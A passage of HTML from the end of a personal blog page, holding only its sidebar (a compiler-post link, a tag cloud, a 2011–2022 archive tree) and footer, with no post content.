href="/entry/2019/10/21/make-own-language-and-compiler/">Brainf**k からはじめる自作コンパイラ</a></li></ul></section></div><section class="tag-cloud"><h4><svg class="svg-inline--fa fa-tags fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 512 512" data-icon="tags" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M345 39.1L472.8 168.4c52.4 53 52.4 138.2 0 191.2L360.8 472.9c-9.3 9.4-24.5 9.5-33.9 .2s-9.5-24.5-.2-33.9L438.6 325.9c33.9-34.3 33.9-89.4 0-123.7L310.9 72.9c-9.3-9.4-9.2-24.6 .2-33.9s24.6-9.2 33.9 .2zM0 229.5V80C0 53.5 21.5 32 48 32H197.5c17 0 33.3 6.7 45.3 18.7l168 168c25 25 25 65.5 0 90.5L277.3 442.7c-25 25-65.5 25-90.5 0l-168-168C6.7 262.7 0 246.5 0 229.5zM144 144c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32z" fill="currentColor"></path></svg> Tags</h4><ul class="tag-list"><li><a href="/entry/tags/android/"><span>Android</span></a></li><li><a href="/entry/tags/arch-linux/"><span>Arch Linux</span></a></li><li><a href="/entry/tags/arduino/"><span>Arduino</span></a></li><li><a href="/entry/tags/c/"><span>C++</span></a></li><li><a href="/entry/tags/ctf/"><span>CTF</span></a></li><li><a href="/entry/tags/diy-pc/"><span>DIY PC</span></a></li><li><a href="/entry/tags/docker/"><span>Docker</span></a></li><li><a href="/entry/tags/fpga/"><span>FPGA</span></a></li><li><a href="/entry/tags/game/"><span>Game</span></a></li><li><a href="/entry/tags/gochiusa/"><span>Gochiusa</span></a></li><li><a href="/entry/tags/hakyll/"><span>Hakyll</span></a></li><li><a href="/entry/tags/haskell/"><span>Haskell</span></a></li><li><a href="/entry/tags/linux/"><span>Linux</span></a></li><li><a href="/entry/tags/machine-learning/"><span>Machine learning</span></a></li><li><a href="/entry/tags/network/"><span>Network</span></a></li><li><a href="/entry/tags/raspberry-pi/"><span>Raspberry Pi</span></a></li><li><a href="/entry/tags/rust/"><span>Rust</span></a></li><li><a href="/entry/tags/slack/"><span>Slack</span></a></li><li><a href="/entry/tags/thinkpad-x13/"><span>ThinkPad X13</span></a></li><li><a href="/entry/tags/vaio-z2/"><span>VAIO Z2</span></a></li><li><a href="/entry/tags/vim/"><span>Vim</span></a></li><li><a href="/entry/tags/walkmanz/"><span>WalkmanZ</span></a></li><li><a href="/entry/tags/website/"><span>Website</span></a></li><li><a href="/entry/tags/xperia-nx/"><span>Xperia NX</span></a></li><li><a href="/entry/tags/xperia-arc/"><span>Xperia arc</span></a></li><li><a href="/entry/tags/xperia2011/"><span>Xperia2011</span></a></li><li><a href="/entry/tags/seccamp/"><span>seccamp</span></a></li></ul></section><section class="archives"><h4><svg class="svg-inline--fa fa-box-archive fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 512 512" data-icon="box-archive" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M32 32H480c17.7 0 32 14.3 32 32V96c0 17.7-14.3 32-32 32H32C14.3 128 0 113.7 0 96V64C0 46.3 14.3 32 32 32zm0 128H480V416c0 35.3-28.7 64-64 64H96c-35.3 0-64-28.7-64-64V160zm128 80c0 8.8 7.2 16 16 16H336c8.8 0 16-7.2 16-16s-7.2-16-16-16H176c-8.8 0-16 7.2-16 16z" fill="currentColor"></path></svg> Archives</h4><ul class="archive-tree"><li><input class="tree-toggle" type="checkbox" id="tree-label-2022"><label class="tree-toggle-button" for="tree-label-2022"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2022/">2022 (1)</a></label><ul class="tree-child"><li><a href="/entry/2022/09/">2022/09 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2020"><label class="tree-toggle-button" for="tree-label-2020"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2020/">2020 (3)</a></label><ul class="tree-child"><li><a href="/entry/2020/11/">2020/11 (1)</a></li><li><a href="/entry/2020/09/">2020/09 (1)</a></li><li><a href="/entry/2020/07/">2020/07 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2019"><label class="tree-toggle-button" for="tree-label-2019"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2019/">2019 (4)</a></label><ul class="tree-child"><li><a href="/entry/2019/10/">2019/10 (1)</a></li><li><a href="/entry/2019/08/">2019/08 (2)</a></li><li><a href="/entry/2019/05/">2019/05 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2018"><label class="tree-toggle-button" for="tree-label-2018"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2018/">2018 (5)</a></label><ul class="tree-child"><li><a href="/entry/2018/10/">2018/10 (1)</a></li><li><a href="/entry/2018/09/">2018/09 (1)</a></li><li><a href="/entry/2018/08/">2018/08 (1)</a></li><li><a href="/entry/2018/03/">2018/03 (1)</a></li><li><a href="/entry/2018/01/">2018/01 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2017" checked><label class="tree-toggle-button" for="tree-label-2017"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2017/">2017 (5)</a></label><ul class="tree-child"><li><a href="/entry/2017/09/">2017/09 (1)</a></li><li><a href="/entry/2017/05/">2017/05 (1)</a></li><li><a href="/entry/2017/02/">2017/02 (3)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2016"><label class="tree-toggle-button" for="tree-label-2016"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2016/">2016 (8)</a></label><ul class="tree-child"><li><a href="/entry/2016/08/">2016/08 (2)</a></li><li><a href="/entry/2016/07/">2016/07 (1)</a></li><li><a href="/entry/2016/06/">2016/06 (1)</a></li><li><a href="/entry/2016/05/">2016/05 (1)</a></li><li><a href="/entry/2016/03/">2016/03 (1)</a></li><li><a href="/entry/2016/01/">2016/01 (2)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2015"><label class="tree-toggle-button" for="tree-label-2015"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2015/">2015 (12)</a></label><ul class="tree-child"><li><a href="/entry/2015/12/">2015/12 (1)</a></li><li><a href="/entry/2015/08/">2015/08 (1)</a></li><li><a href="/entry/2015/06/">2015/06 (2)</a></li><li><a href="/entry/2015/05/">2015/05 (2)</a></li><li><a href="/entry/2015/04/">2015/04 (1)</a></li><li><a href="/entry/2015/03/">2015/03 (2)</a></li><li><a href="/entry/2015/02/">2015/02 (1)</a></li><li><a href="/entry/2015/01/">2015/01 (2)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2014"><label class="tree-toggle-button" for="tree-label-2014"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2014/">2014 (62)</a></label><ul class="tree-child"><li><a href="/entry/2014/12/">2014/12 (7)</a></li><li><a href="/entry/2014/11/">2014/11 (4)</a></li><li><a href="/entry/2014/10/">2014/10 (3)</a></li><li><a href="/entry/2014/09/">2014/09 (3)</a></li><li><a href="/entry/2014/08/">2014/08 (5)</a></li><li><a href="/entry/2014/07/">2014/07 (6)</a></li><li><a href="/entry/2014/06/">2014/06 (6)</a></li><li><a href="/entry/2014/05/">2014/05 (4)</a></li><li><a href="/entry/2014/04/">2014/04 (6)</a></li><li><a href="/entry/2014/03/">2014/03 (7)</a></li><li><a href="/entry/2014/02/">2014/02 (5)</a></li><li><a href="/entry/2014/01/">2014/01 (6)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2013"><label class="tree-toggle-button" for="tree-label-2013"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2013/">2013 (116)</a></label><ul class="tree-child"><li><a href="/entry/2013/12/">2013/12 (8)</a></li><li><a href="/entry/2013/11/">2013/11 (6)</a></li><li><a href="/entry/2013/10/">2013/10 (5)</a></li><li><a href="/entry/2013/09/">2013/09 (5)</a></li><li><a href="/entry/2013/08/">2013/08 (4)</a></li><li><a href="/entry/2013/07/">2013/07 (3)</a></li><li><a href="/entry/2013/06/">2013/06 (12)</a></li><li><a href="/entry/2013/05/">2013/05 (16)</a></li><li><a href="/entry/2013/04/">2013/04 (16)</a></li><li><a href="/entry/2013/03/">2013/03 (27)</a></li><li><a href="/entry/2013/02/">2013/02 (7)</a></li><li><a href="/entry/2013/01/">2013/01 (7)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2012"><label class="tree-toggle-button" for="tree-label-2012"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2012/">2012 (11)</a></label><ul class="tree-child"><li><a href="/entry/2012/12/">2012/12 (3)</a></li><li><a href="/entry/2012/09/">2012/09 (1)</a></li><li><a href="/entry/2012/07/">2012/07 (4)</a></li><li><a href="/entry/2012/04/">2012/04 (1)</a></li><li><a href="/entry/2012/03/">2012/03 (1)</a></li><li><a href="/entry/2012/01/">2012/01 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2011"><label class="tree-toggle-button" for="tree-label-2011"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2011/">2011 (12)</a></label><ul class="tree-child"><li><a href="/entry/2011/09/">2011/09 (1)</a></li><li><a href="/entry/2011/06/">2011/06 (1)</a></li><li><a href="/entry/2011/05/">2011/05 (1)</a></li><li><a href="/entry/2011/03/">2011/03 (6)</a></li><li><a href="/entry/2011/02/">2011/02 (1)</a></li><li><a href="/entry/2011/01/">2011/01 (2)</a></li></ul></li></ul></section></div></div><div class="footer-bottom"><div class="container"><div class="copyright">© 2011-2022 Tosainu. Site generated by <a href="https://jaspervdj.be/hakyll/" target="_blank" rel="nofollow noopener">Hakyll</a>.</div></div></div></footer></body></html>
